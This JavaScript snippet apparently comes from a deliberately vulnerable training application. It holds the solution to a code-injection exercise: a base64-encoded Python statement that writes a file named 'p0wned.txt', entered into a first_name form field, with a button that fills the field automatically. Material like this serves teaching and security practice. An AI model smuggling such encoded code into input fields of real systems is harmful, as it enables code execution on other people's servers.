var solutionHTML = FSTR(function(){/*
<h4>Solution</h4>

<p>Open an interactive Python session.</p>
<p>If you're on Python 3, execute:
<code>import base64; base64.encodestring(b"open('p0wned.txt','w').write('boom!')")</code>
</p>
<p>If you're on Python 2, execute:
<code>import base64; base64.encodestring("open('p0wned.txt','w').write('boom!')")</code>
</p>
<p>and copy-n-paste the value into the textbox.</p>
<p><a class="tiny button" id="do_solution">do it</a></p>
*/});

solutionSetup = function() {
    $('#do_solution').click(function() {
        $('input[name="first_name"]').val('b3BlbigncDB3bmVkLnR4dCcsJ3cnKS53cml0ZSgnYm9vbSEnKQ==');
        return false;
    });
};
